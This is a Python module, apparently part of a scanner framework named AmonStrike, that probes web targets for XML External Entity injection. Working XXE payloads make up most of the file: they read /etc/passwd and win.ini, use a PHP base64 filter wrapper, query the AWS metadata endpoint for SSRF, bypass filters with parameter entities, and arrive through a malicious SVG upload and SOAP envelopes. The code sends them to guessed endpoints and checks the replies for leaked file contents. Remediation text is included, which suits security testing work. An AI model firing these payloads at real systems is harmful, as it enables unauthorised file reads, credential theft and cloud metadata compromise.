"""
AmonStrike — XML External Entity (XXE) Injection Module
Discovered to be massively prevalent in the 2010s.
Still in OWASP Top 10.

Types:
  Classic XXE     — reads local files via SYSTEM entity
  Blind XXE       — out-of-band data exfiltration
  XXE via SVG     — image upload vectors
  XXE via XLSX    — spreadsheet upload vectors
  XXE via DOCX    — document upload vectors
  XXE via RSS     — feed parser vectors
  SSRF via XXE    — server-side request forgery
"""

import re
import base64
from urllib.parse import urljoin, urlparse
from .base import BaseModule


class XxeModule(BaseModule):
    NAME        = "xxe"
    DESCRIPTION = "XML External Entity injection — file read, SSRF, OOB"

    # XXE payloads for file reading
    FILE_READ_PAYLOADS = [
        # Linux
        ("Linux /etc/passwd",
         """<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><data>&xxe;</data></root>"""),

        # Linux via PHP wrapper
        ("PHP base64 wrapper",
         """<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]>
<root><data>&xxe;</data></root>"""),

        # Windows
        ("Windows win.ini",
         """<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>
<root><data>&xxe;</data></root>"""),

        # SSRF via XXE
        ("SSRF — AWS metadata",
         """<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<root><data>&xxe;</data></root>"""),

        # Parameter entity (bypasses some filters)
        ("Parameter entity bypass",
         """<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd"> %xxe;]>
<root><data>test</data></root>"""),
    ]

    # XXE detection indicators
    SUCCESS_INDICATORS = [
        "root:x:0:0",           # /etc/passwd
        "daemon:x:",
        "[boot loader]",        # win.ini
        "extensions",
        "ami-id",               # AWS metadata
        "instance-id",
    ]

    def run(self):
        self.log("Testing for XML External Entity (XXE) injection...")

        self._find_xml_endpoints()
        self._test_upload_xxe()
        self._test_content_type_xxe()
        self._test_soap_xxe()

        self.log(f"XXE scan complete — {len(self.findings)} findings", "+")
        return self.result()

    def _find_xml_endpoints(self):
        """Find endpoints that accept XML input."""
        xml_endpoints = []

        # Check Content-Type acceptance
        for ct in ["application/xml","text/xml","application/soap+xml"]:
            payload = self.FILE_READ_PAYLOADS[0][1]
            resp = self.post("", data=payload,
                           headers={"Content-Type": ct})
            if resp and resp.status_code not in [404, 415]:
                xml_endpoints.append(("", ct))
                break

        # Common XML API paths
        xml_paths = [
            "/api", "/api/v1", "/soap", "/wsdl",
            "/ws", "/webservice", "/xml", "/feed",
            "/rss", "/atom", "/sitemap.xml",
        ]

        for path in xml_paths:
            r = self.get(path, headers={"Accept": "application/xml,text/xml"})
            if r and "xml" in r.headers.get("Content-Type","").lower():
                xml_endpoints.append((path, "application/xml"))

        self.info["xml_endpoints"] = xml_endpoints

        # Test each endpoint for XXE
        for path, ct in xml_endpoints:
            self._test_xxe_at_endpoint(path, ct)

    def _test_xxe_at_endpoint(self, path, content_type):
        """Test a specific endpoint for XXE."""
        for payload_name, payload in self.FILE_READ_PAYLOADS:
            resp = self.post(path, data=payload.encode(),
                           headers={"Content-Type": content_type})
            if not resp:
                continue

            # Check for file content in response
            for indicator in self.SUCCESS_INDICATORS:
                if indicator in resp.text:
                    self.add_finding(
                        title=f"XML External Entity (XXE) — {payload_name}",
                        severity="CRITICAL",
                        description=f"XXE injection at {self.url}{path}. Server reads external entities from the XML parser, enabling arbitrary file read and SSRF.",
                        evidence=f"Endpoint: {self.url}{path}\nContent-Type: {content_type}\nPayload: {payload_name}\nIndicator found: {indicator}\nResponse snippet: {resp.text[:300]}",
                        remediation="Disable external entity processing in XML parser. Use defusedxml in Python. Set FEATURE_EXTERNAL_GENERAL_ENTITIES to false in Java.",
                        url=self.url + path,
                        cve="CWE-611"
                    )
                    return

            # Check for error-based disclosure
            xml_errors = [
                "XML parsing error", "SAXParseException",
                "XMLParseError", "ExpatError",
                "org.xml.sax", "javax.xml.parsers",
            ]
            if any(e in resp.text for e in xml_errors):
                self.add_finding(
                    title=f"XML Parser Error Disclosure at {path}",
                    severity="MEDIUM",
                    description="XML parser error exposed in response. May indicate vulnerable XML processing.",
                    evidence=f"XML error in response at {path}",
                    remediation="Disable detailed XML error messages. Use proper error handling.",
                    url=self.url + path,
                    cve="CWE-611"
                )

    def _test_upload_xxe(self):
        """Test file upload endpoints for XXE via SVG/XLSX/DOCX."""
        # Find upload endpoints
        upload_paths = ["/upload", "/api/upload", "/file/upload", "/image/upload"]

        for path in upload_paths:
            r = self.get(path)
            if not r or r.status_code == 404:
                continue

            # Test SVG XXE
            svg_xxe = b"""<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN"
"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd" [
<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg">
<text font-size="16" x="0" y="16">&xxe;</text>
</svg>"""

            files = {"file": ("evil.svg", svg_xxe, "image/svg+xml")}
            try:
                resp = self.session.post(
                    self.url + path, files=files, timeout=self.timeout
                )
                if resp and any(ind in resp.text for ind in self.SUCCESS_INDICATORS):
                    self.add_finding(
                        title=f"SVG XXE via File Upload at {path}",
                        severity="CRITICAL",
                        description=f"SVG file upload at {path} processes XML entities, enabling file read via XXE.",
                        evidence=f"SVG with XXE payload uploaded to {path}\nResponse contains /etc/passwd content",
                        remediation="Sanitize SVG uploads with a sanitizer library. Disable external entity processing before parsing SVG. Convert SVG to raster format before storage.",
                        url=self.url + path,
                        cve="CWE-611"
                    )
            except Exception:
                pass

    def _test_content_type_xxe(self):
        """Test JSON endpoints that may secretly accept XML."""
        # Some endpoints accept both JSON and XML
        json_paths = ["/api", "/api/v1/data", "/api/search"]

        for path in json_paths:
            r = self.get(path)
            if not r or r.status_code == 404:
                continue

            # Try submitting XML where JSON is expected
            for _, payload in self.FILE_READ_PAYLOADS[:2]:
                resp = self.post(path, data=payload,
                               headers={"Content-Type": "application/xml"})
                if resp and any(ind in resp.text for ind in self.SUCCESS_INDICATORS):
                    self.add_finding(
                        title=f"XXE via Content-Type Switch at {path}",
                        severity="CRITICAL",
                        description=f"JSON endpoint at {path} also accepts XML input and processes external entities.",
                        evidence=f"Switched Content-Type to application/xml\nXXE payload processed at {path}",
                        remediation="Explicitly restrict accepted Content-Types. Validate and parse only expected content types.",
                        url=self.url + path,
                        cve="CWE-611"
                    )
                    break

    def _test_soap_xxe(self):
        """Test SOAP endpoints for XXE."""
        soap_paths = ["/soap", "/ws", "/wsdl", "/service", "/api/soap"]

        soap_xxe = """<?xml version="1.0"?>
<!DOCTYPE soap [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
<soap:Body><test>&xxe;</test></soap:Body>
</soap:Envelope>"""

        for path in soap_paths:
            resp = self.post(path, data=soap_xxe,
                           headers={"Content-Type": "text/xml; charset=utf-8",
                                   "SOAPAction": '""'})
            if resp and resp.status_code not in [404, 405]:
                if any(ind in resp.text for ind in self.SUCCESS_INDICATORS):
                    self.add_finding(
                        title=f"SOAP XXE Injection at {path}",
                        severity="CRITICAL",
                        description=f"SOAP endpoint at {path} vulnerable to XXE injection.",
                        evidence=f"SOAP XXE payload processed at {path}",
                        remediation="Disable external entity processing in SOAP parser. Update XML library to patched version.",
                        url=self.url + path,
                        cve="CWE-611"
                    )
